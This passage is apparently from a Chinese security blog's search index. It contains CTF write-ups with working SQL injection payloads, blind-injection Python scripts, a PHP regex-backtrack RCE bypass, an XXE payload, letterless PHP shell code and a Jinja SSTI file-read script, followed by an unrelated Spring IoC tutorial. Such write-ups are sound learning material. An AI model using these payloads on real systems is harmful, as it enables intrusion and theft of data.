extractvalue(0x0a,concat(0x0a,(sELect group_concat(table_name) from information_schema.tables where table_schema=database() ))) # 1admin&#x27; and extractvalue(0x0a,concat(0x0a,(sELect group_concat(column_name) from information_schema.columns where table_name=&#x27;fl4g&#x27; ))) #","categories":[],"tags":[{"name":"BUU","slug":"BUU","permalink":"http://example.com/tags/BUU/"},{"name":"SQL注入","slug":"SQL注入","permalink":"http://example.com/tags/SQL%E6%B3%A8%E5%85%A5/"}]},{"title":"RCTF2015EasySQL","slug":"RCTF2015EasySQL","date":"2020-11-18T09:57:30.000Z","updated":"2020-12-08T13:51:35.524Z","comments":true,"path":"2020/11/18/RCTF2015EasySQL/","link":"","permalink":"http://example.com/2020/11/18/RCTF2015EasySQL/","excerpt":"","text":"考点：一个SQL注入，二次注入+报错注入 当我们注册用户修改密码的时候便会触发 过程：我们可以测试一下被过滤了什么： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198length +handlerlikeselect sleepdatabasedeletehavingoras-~BENCHMARKlimitleftselectinsertsys.schema_auto_increment_columnsjoinright#&amp;&amp;&amp;\\handler-- -----+INFORMATION--;!%+xor&lt;&gt;(&gt;&lt;).^=ANDBYCASTCOLUMNCOUNTCREATEENDcase&#x27;1&#x27;=&#x27;1whenadmin&#x27;&quot;length +lengthREVERSEasciiselect databaseleftright&#x27;union||oorr/////**/*/**/ananddGROUPHAVINGIFINTOJOINLEAVELEFTLEVELsleepLIKENAMESNEXTNULLOFON|infromation_schemauserORORDERORDSCHEMASELECTSETTABLETHENUPDATEUSERUSINGVALUEVALUESWHENWHEREADDANDpreparesetupdatedeletedropinsetCASTCOLUMNCONCATGROUP_CONCATgroup_concatCREATEDATABASEDATABASESalterDELETEDROPfloorrand()information_schema.tablesTABLE_SCHEMA%dfconcat_ws()concatLIMITORDONextractvalueorder CAST()byORDEROUTFILERENAMEREPLACESCHEMASELECTSETupdatexmlSHOWSQLTABLETHENTRUEinstrbenchmarkformatbinsubstringordUPDATEVALUESVARCHARVERSIONWHENWHERE/*` ,users%0a%0bmidforBEFOREREGEXPRLIKEinsys schemmaSEPARATORXORCURSORFLOORsys.schema_table_statistics_with_bufferINFILEcount%0cfrom%0d%a0=@else 直接用别人的字典来查一下 大概对我们注入有影响的只有空格，select的话我们可以用大小写的方式进行绕过，于是去mysql里面尝试构造出语句： 1234567mysql&gt; select * from websites where id &#x3D;1 and(select updatexml(1,concat(&#39;~&#39;,(select(database()))),1));ERROR 1105 (HY000): XPATH syntax error: &#39;~runoob&#39;mysql&gt; select * from websites where id &#x3D;1 and(select updatexml(1,concat(&#39;~&#39;,(select(database()))),1));ERROR 1105 (HY000): XPATH syntax error: &#39;~runoob&#39;mysql&gt; select * from websites where id &#x3D;1 and(select(updatexml(1,concat(&#39;~&#39;,(select(database()))),1)));ERROR 1105 (HY000): XPATH syntax error: &#39;~runoob&#39; 得到注入语句： 12admin&quot;^(select(updatexml(1,concat(&#x27;~&#x27;,(select(database()))),1)))##XPATH syntax error: &#x27;~web_sqli&#x27; 得到数据库的名字. 下一步获取表名： 1admin&quot;^(select(updatexml(1,concat(0x7e,(select(table_name)from(information_schema.tables)where(table_schema&#x3D;database()))),0x7e)))# 这样的话会报错，Subquery returns more than 1 row，因为不止一个表，那我们添加group_concat函数 在mysql中测试： 12345mysql&gt; select * from student where STID&#x3D;1 and (select(updatexml(1,concat(0x7e,(select(table_name)from(information_schema.tables)where(table_schema&#x3D;database()))),0x7e)));ERROR 1242 (21000): Subquery returns more than 1 rowmysql&gt; select * from student where STID&#x3D;1 and (select(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema&#x3D;database()))),0x7e)));ERROR 2013 (HY000): Lost connection to MySQL server during querymysql&gt; select * from student where STID&#x3D;1 and (select(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema&#x3D;database()))),0x7e))); 得到表名： 1XPATH syntax error: &#x27;~article,flag,users&#x27; 这里提前剧透一下，flag表的东西是假flag，纯粹作者搞心态的，我一直觉得这种东西很多余好吧。 123mysql&gt; select * from student WHERE STID&#x3D;1 and(select updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name&#x3D;&quot;student&quot;)),0x7e));ERROR 1105 (HY000): XPATH syntax error: &#39;~STID,STNAME,STSEX,STAGE,STPHONE&#39;mysql&gt; select * from student WHERE STID&#x3D;1 and(select updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name&#x3D;&quot;student&quot;)),0x7e)); 得到字段名： 1XPATH syntax error: &#x27;~name,pwd,email,real_flag_1s_her&#x27; 这里其实我们就可以发现一个不方便的地方了，报错注入的回显是有限的，所以这里后面应该是here，却没有显示出来 注入： 1admin&quot;^(select(updatexml(1,concat(0x7e,(select(group_concat(real_flag_1s_here))from(users))),0x7e)))# 得到的东西很奇怪： ~xxxx,xxx,xxx什么的，这就很恶心人了，于是我们尝试用正则表达式来匹配我们需要的数据 别人的语句： 12admin&quot;||(updatexml(1,concat(0x3a,(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#39;^f&#39;))),1))# 得到前半段的flag： 1XPATH syntax error: &#39;:flag&#123;8091937b-0547-42a3-b7b3-41&#39; 这样的话还是不够，我们应该获取全部的数据，于是继续构造： 12345678910111213141516ERROR 1105 (HY000): XPATH syntax error: &#39;~fuzhufuzh&#39;mysql&gt; select * from student where STID &#x3D;1 and(select(updatexml(1,concat(0x7e,(select(group_concat(STNAME))from student)),0x7e)));ERROR 1105 (HY000): XPATH syntax error: &#39;~fuzhufuzh&#39;mysql&gt; select * from student where STID &#x3D;1 and(select(updatexml(1,concat(0x7e,(select reverse((group_concat(STNAME)))from student)),0x7e)));ERROR 1105 (HY000): XPATH syntax error: &#39;~hzufuhzuf&#39;mysql&gt; select * from student where STID &#x3D;1 and(select(updatexml(1,concat(0x7e,(select(reverse((group_concat(STNAME))))from student)),0x7e)));ERROR 2013 (HY000): Lost connection to MySQL server during querymysql&gt; select * from student where STID &#x3D;1 and(select(updatexml(1,concat(0x7e,(select(reverse((group_concat(STNAME))))from student)),0x7e)));ERROR 2006 (HY000): MySQL server has gone awayNo connection. Trying to reconnect...Connection id: 11Current database: webosERROR 1105 (HY000): XPATH syntax error: &#39;~hzufuhzuf&#39;mysql&gt; select * from student where STID &#x3D;1 and(select(updatexml(1,concat(0x7e,(select(reverse((group_concat(STNAME))))from student)),0x7e))); 因为Markdown自动的弱智不全，导致我fuzz了巨他妈久 12admin&quot;||(updatexml(1,concat(0x3a,(select(reverse(group_concat(real_flag_1s_here)))from(users)where(real_flag_1s_here)regexp(&#39;^f&#39;))),1))# 得到flag： 1flag&#123;8091937b-0547-42a3-b7b3-415a267a6a46&#125; 总结：这道题的不难，就是出题人比较险恶，让你需要测试很久，过滤的东西，也很多，但是自己还是学到很多东西的，这里记录一下regexp： 1https://dev.mysql.com/doc/refman/5.7/en/regexp.html#operator_regexp 官方允许用户查询的时候使用正则表达式来返回满足的结果，若我们对一串字符串进行查询，若查询成功，则会返回1，否则就是0 除此之外，若我们查询的是一个结果集，则会返回匹配的相应数据： 总结下来查询的结果如下： 123select [内容] from [表名] where [限定查询目标，只能去匹配一个字段的目标] REGEXP [&#39;正则表达式&#39;];#例子：SELECT * from websites where url REGEXP &#39;goo&#39;; 那么我们的注入语句可以编写成： 1admin&quot;||(updatexml(1,concat(0x3a,(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#39;^f&#39;))),1))# 除此之外应该还可以利用该语句进行盲注： 首先构造if语句，if语句格式如下： 12345678mysql&gt; SELECT IF(1&gt;2,2,3); -&gt; 3mysql&gt; SELECT IF(1&lt;2,&#39;yes&#39;,&#39;no&#39;); -&gt; &#39;yes&#39;mysql&gt; SELECT IF(STRCMP(&#39;test&#39;,&#39;test1&#39;),&#39;no&#39;,&#39;yes&#39;); -&gt; &#39;no&#39;#那么格式如下：if([判断表达式],[成功的结果],[失败的结果]); 注入中通常使用： 1234567891011121314mysql&gt; select * from websites where id &#x3D;&#39;1&#39; and if( (1&#x3D;1),0,1);Empty set (0.00 sec)mysql&gt; select * from websites where id &#x3D;&#39;1&#39; and if( (1&#x3D;1),1,0);+----+--------+------------------------+-------+---------+| id | name | url | alexa | country |+----+--------+------------------------+-------+---------+| 1 | Google | https:&#x2F;&#x2F;www.google.cm&#x2F; | 1 | USA |+----+--------+------------------------+-------+---------+1 row in set (0.00 sec)#逻辑符号：#&amp;&amp; 为 and，^ 为xor，||为或 拼凑出来可以得到： 1and 1&#x3D;(SELECT 1 FROM information_schema.tables WHERE TABLE_SCHEMA&#x3D;&quot;security&quot; AND table_name REGEXP &#39;^e&#39; LIMIT 0,1) 这里顺便记录一下load_file的报错注入： 1search.php?keywords=&#x27;and extractvalue(0x7e,concat(0x7e,(mid((select load_file(&#x27;ar/wwwml/flag.php&#x27;)),60,80))))--+ 文章： 1https:&#x2F;&#x2F;www.freesion.com&#x2F;article&#x2F;2367234678&#x2F;","categories":[],"tags":[{"name":"BUU","slug":"BUU","permalink":"http://example.com/tags/BUU/"},{"name":"SQL注入","slug":"SQL注入","permalink":"http://example.com/tags/SQL%E6%B3%A8%E5%85%A5/"}]},{"title":"FBCTF2018RCEService","slug":"FBCTF2018RCEService","date":"2020-11-17T07:15:27.000Z","updated":"2020-11-17T07:51:04.195Z","comments":true,"path":"2020/11/17/FBCTF2018RCEService/","link":"","permalink":"http://example.com/2020/11/17/FBCTF2018RCEService/","excerpt":"","text":"要盲试试出来。。。大佬说是有源码： 123456789101112131415161718192021222324&lt;?phpputenv(&#x27;PATH=/home/rceservice/jail&#x27;);if (isset($_REQUEST[&#x27;cmd&#x27;])) &#123; $json = $_REQUEST[&#x27;cmd&#x27;]; if (!is_string($json)) &#123; echo &#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;; &#125; elseif (preg_match(&#x27;/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\\x00-\\x1FA-Z0-9!#-\\/;-@\\[-`|~\\x7F]+).*$/&#x27;, $json)) &#123; echo &#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;; &#125; else &#123; echo &#x27;Attempting to run command:&lt;br/&gt;&#x27;; $cmd = json_decode($json, true)[&#x27;cmd&#x27;]; if ($cmd !== NULL) &#123; system($cmd); &#125; else &#123; echo &#x27;Invalid input&#x27;; &#125; echo &#x27;&lt;br/&gt;&lt;br/&gt;&#x27;; &#125;&#125;?&gt; 这道题注意这里： 1putenv(&#x27;PATH=/home/rceservice/jail&#x27;); 所以我们想要执行命令的话必须通过/bin/cat来执行系统命令（本人不是很能明白原因。。） 正则绕过，这里可以通过P牛大佬的文章： 1https:&#x2F;&#x2F;www.leavesongs.com&#x2F;PENETRATION&#x2F;use-pcre-backtrack-limit-to-bypass-restrict.html 阅读P牛大佬的文章，大致意思是，PHP的正则并不是通过根据正则的匹配来决定下一步的，如果满足条件的话，正则便会无限的向后匹配，直到末尾之后，如果正则没有能够成功匹配结尾，就会往回回溯，来查找到满足条件的情况 类似P牛大佬的例子，如果按照我们的思路的话，当匹配到 ;的时候，已经匹配成功，所以就应该停下来了，但是由于.*可以匹配任意，故我们会一直匹配到最后一步，但此时正则没有匹配成功，就会往前推，直到正则匹配成功。 又因为P牛师傅说的，只要回溯100000此就会失败，所以我们发送一串超级长的字符串即可 123456789import requestsparams = &#x27;&#123;&quot;cmd&quot;:&quot;/bin/cat /home/rceservice/flag&quot;,&quot;123&quot;:&quot;&#x27; + &quot;a&quot;*(1000000) + &#x27;&quot;&#125;&#x27;params = &#123;&quot;cmd&quot;:params&#125;url = &quot;http://e23f7266-20a3-4aa0-bfbc-8a9502764002.node3.buuoj.cn&quot;res = requests.post(url=url,data=params).textprint(res) 注意这里一定要发送post包，get包无法接受这么长的参数，传过去就可以得到flag了","categories":[],"tags":[{"name":"BUU","slug":"BUU","permalink":"http://example.com/tags/BUU/"},{"name":"php","slug":"php","permalink":"http://example.com/tags/php/"}]},{"title":"PHP的一个内置类","slug":"PHP的一个内置类","date":"2020-11-16T13:41:28.000Z","updated":"2020-12-20T13:49:15.069Z","comments":true,"path":"2020/11/16/PHP的一个内置类/","link":"","permalink":"http://example.com/2020/11/16/PHP%E7%9A%84%E4%B8%80%E4%B8%AA%E5%86%85%E7%BD%AE%E7%B1%BB/","excerpt":"","text":"某店里比赛题目： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119&lt;?phpclass User&#123; private static $c = 0; public function __construct($ra,$rb) &#123;// $c = $ra;// $c = $rb; &#125; function a() &#123; return ++self::$c; &#125; function b() &#123; return ++self::$c; &#125; function c() &#123; return ++self::$c; &#125; function d() &#123; return ++self::$c; &#125; function e() &#123; return ++self::$c; &#125; function f() &#123; return ++self::$c; &#125; function g() &#123; return ++self::$c; &#125; function h() &#123; return ++self::$c; &#125; function i() &#123; return ++self::$c; &#125; function j() &#123; return ++self::$c; &#125; function k() &#123; return ++self::$c; &#125; function l() &#123; return ++self::$c; &#125; function m() &#123; return ++self::$c; &#125; function n() &#123; return ++self::$c; &#125; function o() &#123; return ++self::$c; &#125; function p() &#123; return ++self::$c; &#125; function q() &#123; return ++self::$c; &#125; function r() &#123; return ++self::$c; &#125; function s() &#123; return ++self::$c; &#125; function t() &#123; return ++self::$c; &#125;&#125;$rc=$_GET[&quot;rc&quot;];$rb=$_GET[&quot;rb&quot;];$ra=$_GET[&quot;ra&quot;];$rd=$_GET[&quot;rd&quot;];$method= new $rc($ra, $rb);var_dump($method-&gt;$rd()); 我们可以控制四个参数，但是我们明显知道，这里的User类完全没有意义，题目给出提示让我们想想还有什么类，想了半天应该是内置类，队里的w4nder师傅直接给我exp了，WTM直接开舔 1?rc&#x3D;SimpleXMLElement&amp;ra&#x3D;&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY [&lt;!ENTITY xxe SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;.&#x2F;index.php&quot;&gt;]&gt;&lt;x&gt;&amp;xxe;&lt;&#x2F;x&gt;&amp;rb&#x3D;2&amp;rd&#x3D;__toString 无字母RCE： 12$_&#x3D;&quot;&#96;&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;&#x2F;&quot;;$&#123;$_&#125;[_]($&#123;$_&#125;[__]); &#x2F;&#x2F;$_GET[_]($_GET[__])http:&#x2F;&#x2F;69.90.132.196:5003&#x2F;?warmup&#x3D;$_&#x3D;&quot;&#96;&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;&#x2F;&quot;;$&#123;$_&#125;[_]($&#123;$_&#125;[__]);&amp;_&#x3D;readfile&amp;__&#x3D;flag.php 另外还看到了一种读文件的 payload，收藏了 123$_=&quot;@:&gt;;963:&quot;^&quot;2_______&quot;; // readfile$__=&quot;____&quot;^&quot;830=&quot;; // glob$_($__(&#x27;*&#x27;)[0]); // readfile(glob(&#x27;*&#x27;))","categories":[],"tags":[]},{"title":"2020上海市网络安全大赛","slug":"2020上海市网络安全大赛","date":"2020-11-14T08:34:25.000Z","updated":"2020-11-17T06:03:38.282Z","comments":true,"path":"2020/11/14/2020上海市网络安全大赛/","link":"","permalink":"http://example.com/2020/11/14/2020%E4%B8%8A%E6%B5%B7%E5%B8%82%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/","excerpt":"","text":"注入杯，感觉也是自闭的一天orz,垃圾文章，只不过是记录一下脚本 千毒网盘 1https:&#x2F;&#x2F;blog.csdn.net&#x2F;weixin_30258901&#x2F;article&#x2F;details&#x2F;96605162 在这个🔗下我们可以找到的！利用比较简单，如果我们需要的参数在get上，可以构造如下： 123?code = xx_GET[code] =xx只需要两者保持一致即可 如果在POST上，则反过来： 12?_POST[code] =xxcode =xx 由于$$key_2 == $value_2使得POST的值被unset了，绕过waf，后面再次extract造成变量覆盖 然后是布尔盲注，这里用–+代替#，不然会出现错误情况 队里师傅的脚本： 12345678910111213141516171819202122232425262728293031323334import requestsimport stringurl=&quot;http://eci-2zehpt4jc1z3f9vgcraf.cloudeci1.ichunqiu.com/index.php&quot;text=&#x27;&#x27;proxies=&#123;&#x27;http&#x27;:&#x27;127.0.0.1:8080&#x27;,&#x27;https&#x27;:&#x27;127.0.0.1:8080&#x27;&#125;headers = &#123; &quot;Content-Type&quot;:&quot;application/x-www-form-urlencoded&quot;&#125;for i in range(1,200): l=28 h=126 while abs(h - l) &gt; 1: m=(l+h)/2 pay=&quot;select flag from flag&quot; #pay=&quot;database()&quot; e = &quot;(ascii(mid((&#123;&#125;),&#123;&#125;,1)))&gt;&#123;&#125;&quot;.format(pay, i, m) data = &quot;code=114514&#x27;and if((&#123;&#125;),1,0)--+&quot;.format(e) #print(data) #print(url+&quot;?_POST[code]=&quot;+data[&#x27;code&#x27;]) re=requests.post(url+&quot;?_POST[code]=&quot;+data.strip(&#x27;code=&#x27;),data=data,headers=headers) #print(re.text) #print(data) #exit() if &#x27;http://gamectf.com/p/CGBU.png&#x27; in re.text: l=m else: h=m mid_num = int((l + h + 1) / 2) text += chr(int(h)) print(text) TryToLogin这道题目是格式化字符串注入，感觉有必要学习一下,sprintf 12345678910111213141516171819202122232425262728import requestsimport stringurl&#x3D;&quot;http:&#x2F;&#x2F;eci-2ze4elsbeer15p6dsvx2.cloudeci1.ichunqiu.com&#x2F;index.php&quot;text&#x3D;&#39;&#39;proxies&#x3D;&#123;&#39;http&#39;:&#39;127.0.0.1:8080&#39;,&#39;https&#39;:&#39;127.0.0.1:8080&#39;&#125;headers &#x3D; &#123; &quot;Content-Type&quot;:&quot;application&#x2F;x-www-form-urlencoded&quot;&#125;for i in range(1,200): l&#x3D;28 h&#x3D;126 while abs(h - l) &gt; 1: m&#x3D;(l+h)&#x2F;2 pay&#x3D;&quot;select group_concat(table_name) from sys.schema_table_statistics_with_buffer where table_schema&#x3D;database()&quot; pay&#x3D;&quot;select * from fl4g&quot; e &#x3D; &quot;(ascii(mid((&#123;&#125;),&#123;&#125;,1)))&gt;&#123;&#125;&quot;.format(pay, i, m) data &#x3D;&quot;password&#x3D;%1$&#39;||if((&#123;&#125;),1,0)--+&quot;.format(e)+&#39;&amp;username&#x3D;admin&#39; re&#x3D;requests.post(url,data&#x3D;data,headers&#x3D;headers) if &#39;登录成功了&#39; in re.text: l&#x3D;m else: h&#x3D;m text +&#x3D; chr(int(h)) print(text) SSTI123456789101112131415161718192021222324252627282930313233343536373839from flask import Flask,request,render_templatefrom jinja2 import Templateimport osapp = Flask(__name__)f = open(&#x27;/flag&#x27;,&#x27;r&#x27;)flag = f.read()@app.route(&#x27;/&#x27;,methods=[&#x27;GET&#x27;,&#x27;POST&#x27;])def home(): name = request.args.get(&quot;name&quot;) or &quot;&quot; print(name) if name: return render_template(&#x27;index.html&#x27;,name=name) else: return render_template(&#x27;index.html&#x27;)@app.route(&#x27;/help&#x27;,methods=[&#x27;GET&#x27;])def help(): help = &#x27;&#x27;&#x27; &#x27;&#x27;&#x27; return f.read()@app.errorhandler(404)def page_not_found(e): #No way to get flag! os.system(&#x27;rm -f /flag&#x27;) url = name = request.args.get(&quot;name&quot;) or &quot;&quot; r = request.path r = request.data.decode(&#x27;utf8&#x27;) if &#x27;eval&#x27; in r or &#x27;popen&#x27; in r or &#x27;&#123;&#123;&#x27; in r: t = Template(&quot; Not found!&quot;) return render_template(t), 404 t = Template(r + &quot; Not found!&quot;) return render_template(t), 404if __name__ == &#x27;__main__&#x27;: app.run(host=&#x27;0.0.0.0&#x27;,port=8888) 这道题比较新有意思的点在两个地方： 过滤了这个地方 1if &#x27;eval&#x27; in r or &#x27;popen&#x27; in r or &#x27;&#123;&#123;&#x27; in r: 过滤了左右花括号,这样子的情况以前自己没有遇过，后来知道可以进行盲注，并且我们可以尝试读取文件，读取文件的payload如下： 1&#123;% if self.__dict__._TemplateReference__context.lipsum.__globals__.__builtins__.open(&quot;your file name &quot;).read()[1:2] &#x3D;&#x3D; &quot;a&quot; %&#125;~p0~&#123;% endif %&#125; 如果满足条件，则会输出p0，否则就不会输出。第二点，我们该读取什么文件呢？ 这里运用了os.system(“rm -f /flag”) 默认的进程删除后会存放在暂时文件中，进程为： 1/proc/self/fd/3 故编写脚本如下： 12345678910111213141516171819202122import requestsimport stringurl = &#x27;http://eci-2ze006f3h1dkgrldoskz.cloudeci1.ichunqiu.com:8888/a&#x27;headers=&#123; &#x27;Content-Type&#x27;:&#x27;application/json&#x27;&#125;def check(payload): r = requests.post(url, data=payload,headers=headers).text return &#x27;~p0~&#x27; in rpassword = &#x27;&#x27;sa=string.printable#print(s)for i in range(0,100): for c in sa: payload=&#x27;&#123;% if self.__dict__._TemplateReference__context.lipsum.__globals__.__builtins__.open(&quot;/proc/self/fd/3&quot;).read()[&#x27; + str(i) + &#x27;:&#x27; + str( i + 1) + &#x27;] == &quot;&#x27; + c + &#x27;&quot; %&#125;~p0~&#123;% endif %&#125;&#x27; # print(payload) if check(payload): password += c break print(password)","categories":[],"tags":[]},{"title":"Spring学习","slug":"Spring学习","date":"2020-11-10T13:58:01.000Z","updated":"2020-11-17T06:09:39.491Z","comments":true,"path":"2020/11/10/Spring学习/","link":"","permalink":"http://example.com/2020/11/10/Spring%E5%AD%A6%E4%B9%A0/","excerpt":"","text":"Spring从今天开始学Sping1.IOC理论推导： UserDao接口 UserDaompl实现类 Userservice业务接口 UserServiceimpl 业务实现类 在之前的业务当中，用户的需求会修改我们的代码，导致代码难以维护，所以我们开始使用了set值植入，set接口，实现不用修改代码，用户只需要调用接口就可以了。 123456789public class UserServiceimp1 implements UserService &#123; private UserDao userDao = new UserDaolmp1(); public void getUser()&#123; userDao.getuser(); &#125;&#125; 先前的代码，在我们调用UserDao的时候因为写死了拓展，所以无法灵活的调用，我们可以使用接口的思想解放 123456789 public void setUserDao(UserDao userDao) &#123; this.userDao = userDao; &#125; public void getUser()&#123; userDao.getuser(); &#125;&#125; ​ 我们将之前写死的代码转变成了set方法，这样子当我们于main方法当中使用的时候： 12345678910public class MyTest &#123; public static void main(String[] args) &#123; UserServiceimp1 userService = new UserServiceimp1(); userService.setUserDao(new UserDaoMysql()); userService.getUser();// 用户实际调用业务层，dao层不需要接触 &#125;&#125; 用户只需要在set后面更改接口就可以了！ IOC的三层架构：Dao层负责实现方法，Service层负责调用Dao的方法，而main方法去调用Service的接口 使用该方法大大降低了业务的耦合性，使得业务的每一部分专心于做好自己的架构即可。 2.IOC的本质​ 控制反转IoC(Inversion of Control),是一种设计思想，DI(依赖注入)是实现IoC的一种方法，也有人认为DI只是IoC的另-种说法。 没有IoC的程序中 ,我们使用面向对象编程 ,对象的创建 与对象间的依赖关系完全硬编码在程序中，对象的创建由程序自己控制，控制反转后将对象的创建转移给第三方，个人认为所谓控制反转就是:获得依赖对象的方式反转了。 ​ 而IOC就是Spring的核心思想！ 3.HelloSpring首先我们需要创建一个类： 12345678910111213141516public class HelloSpring &#123; private String str; public String getStr() &#123; return str; &#125; public void setStr(String str) &#123; this.str = str; &#125; public String tostring() &#123; return &quot;hello&quot;+&quot;str=&quot;+str+&#x27;\\&#x27;&#x27;; &#125;&#125; 创建beans.xml，写入如下： 12345&lt;!-- 使用spring创建对象，这些对象都称为bean--&gt;&lt;bean id=&quot;hello&quot; class=&quot;com.ysllz.pojo.HelloSpring&quot;&gt; &lt;property name=&quot;str&quot; value=&quot;Spring&quot;/&gt; &lt;!-- 属性--&gt;&lt;/bean&gt; 在这里，Spring帮我们做了这么一个事情： 在java当中，我们创建类的时候都是 类 对象名 = new 对象； 而在Spring当中，id为注册的对象名，property当中即可调用类当中的方法，value用于给方法的变量赋值。 12345678910public class Mytest &#123; public static void main(String[] args) &#123;// 获取spring的上下文对象 ClassPathXmlApplicationContext context = new ClassPathXmlApplicationContext(&quot;beans.xml&quot;);// 接下来我们用Spring的管理即可 HelloSpring hello = (HelloSpring) context.getBean(&quot;hello&quot;); System.out.println(hello.tostring()); &#125;&#125; 重点就是一切交给Spring，一切函数不再由你调用，让Spring调用即可。 4.IOC创建对象​ 1.默认直接创建的时候利用的无参构造方法 ​ 2.有参构造的时候我们有三种方式来对参数进行构造： 123456&lt;!-- 键对值的方式，最简单--&gt; &lt;bean id=&quot;hello&quot; class=&quot;com.ysllz.pojo.HelloSpring&quot;&gt; &lt;constructor-arg name=&quot;str&quot; value=&quot;wuhu&quot;/&gt; &lt;constructor-arg index=&quot;0&quot; value=&quot;wuhu&quot;/&gt; &lt;!-- 用下标来赋值--&gt; &lt;constructor-arg type=&quot;java.lang.String&quot; value=&quot;wuhu&quot;/&gt; &lt;!-- 用类型来赋值，不推荐使用--&gt; 注意事项: ​ 在Spring当中，实际上当我们利用Spring进行Context的创建的时候，Spring已经将全部对象导入 1234ApplicationContext context = new ClassPathXmlApplicationContext(&quot;beans.xml&quot;);// 接下来我们用Spring的管理即可HelloSpring hello = (HelloSpring) context.getBean(&quot;hello&quot;);System.out.println(hello.tostring()); 也就是说，如果你的Bean当中即使含有多个类，Spring也将他们全部导入并初始化，用户想要什么去取出来即可。 5.Spring的配置 别名(已没用了) Bean的配置 12&lt;bean id=&quot;hello&quot; class=&quot;com.ysllz.pojo.HelloSpring&quot; name=&quot;u1,u2&quot;&gt; &lt;constructor-arg name=&quot;str&quot; value=&quot;www&quot;/&gt; 在这里的id就是注册名，class就是调用类name已经可以取别名了！ Import 便于多人运动，大伙一起开发的时候，就可以将他们包含在一起了~ 1&lt;import resource=&quot;beans.xml&quot;/&gt; 6.DI依赖注入​ 6.1构造方法注入​ 重写构造方法 6.2set方法注入【重点】​ 依赖：beans的对象依赖于容器！ ​ 注入：bead当中的所有属性·，由容器来注入。 【环境搭建】 ​ 1.复杂类型 2.真实测试对象 123456789public class Student &#123; private String string; private String[] book; private List&lt;String&gt; hobbies; private Map&lt;String,String&gt; card; private Set&lt;String&gt; games; private String wife; private Properties info; ​ 3.beans.xml 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354&lt;!-- 普通注入--&gt; &lt;bean id=&quot;hello&quot; class=&quot;com.ysllz.pojo.HelloSpring&quot; name=&quot;u1,u2&quot;&gt; &lt;constructor-arg name=&quot;str&quot; value=&quot;www&quot;/&gt;&lt;!-- ref注入--&gt; &lt;/bean&gt; &lt;bean id=&quot;address2&quot; class=&quot;com.ysllz.pojo.Address&quot; /&gt; &lt;bean class=&quot;com.ysllz.pojo.Student&quot; id=&quot;student&quot;&gt;&lt;!--数组注入--&gt; &lt;property name=&quot;book&quot;&gt; &lt;array&gt; &lt;value&gt;红楼梦&lt;/value&gt; &lt;value&gt;水浒传&lt;/value&gt; &lt;value&gt;三国演义&lt;/value&gt; &lt;value&gt;西游记&lt;/value&gt; &lt;/array&gt; &lt;/property&gt;&lt;!--list注入--&gt; &lt;property name=&quot;hobbies&quot;&gt; &lt;list&gt; &lt;value&gt;起飞&lt;/value&gt; &lt;value&gt;起飞&lt;/value&gt; &lt;value&gt;起飞&lt;/value&gt; &lt;value&gt;起飞&lt;/value&gt; &lt;/list&gt; &lt;/property&gt;&lt;!-- map注入--&gt; &lt;property name=&quot;card&quot;&gt; &lt;map&gt; &lt;entry key=&quot;身份证&quot; value=&quot;440000000032001&quot;/&gt; &lt;entry key=&quot;银行卡&quot; value=&quot;2213123032001&quot;/&gt; &lt;/map&gt; &lt;/property&gt;&lt;!-- set注入--&gt; &lt;property name=&quot;games&quot;&gt; &lt;set&gt; &lt;value&gt;lol&lt;/value&gt; &lt;value&gt;cod&lt;/value&gt; &lt;value&gt;bot&lt;/value&gt; &lt;/set&gt; &lt;/property&gt; &lt;property name=&quot;wife&quot; &gt;&lt;null/&gt;&lt;/property&gt;&lt;!-- 配置注入--&gt; &lt;property name=&quot;info&quot;&gt; &lt;props&gt; &lt;prop key=&quot;username&quot;&gt;351452024&lt;/prop&gt; &lt;prop key=&quot;password&quot;&gt;3125224&lt;/prop&gt; &lt;/props&gt; &lt;/property&gt; &lt;/bean&gt; ​ 4.测试类 12345678910public class Mytest &#123; public static void main(String[] args) &#123;// 获取spring的上下文对象 ApplicationContext context = new ClassPathXmlApplicationContext(&quot;applicationContext.xml&quot;);// 接下来我们用Spring的管理即可 Student student = (Student) context.getBean(&quot;student&quot;); System.out.println(student.toString()); &#125;&#125; 6.3其他方法注入P,就是set注入，C就是创造器注入 1.Spring的bean的本质实际上就是反转，注入的值，创建对象全部交给Spring的XML来配置了！实际上就是利用Set注入 回顾昨天的代码： 123456789//我们照样是new 了一个新的对象package com.ys.dao;public class UserSQLServer implements UserDao &#123; public void getUser() &#123; System.out.println(&quot;SQLSERVER use it&quot;); &#125;&#125; 重写DAO层的方法，之后在service层当中进行操作： 12345package com.ys.service;public interface UserService &#123; void getUser();&#125; 写一个实现接口类： 1234567891011121314151617181920package com.ys.service;import com.ys.dao.UserDao;public class UserServiceimpl implements UserService&#123; private UserDao userDao; public UserDao getUserDao() &#123; return userDao; &#125; public void setUserDao(UserDao userDao) &#123; this.userDao = userDao; &#125; public void getUser() 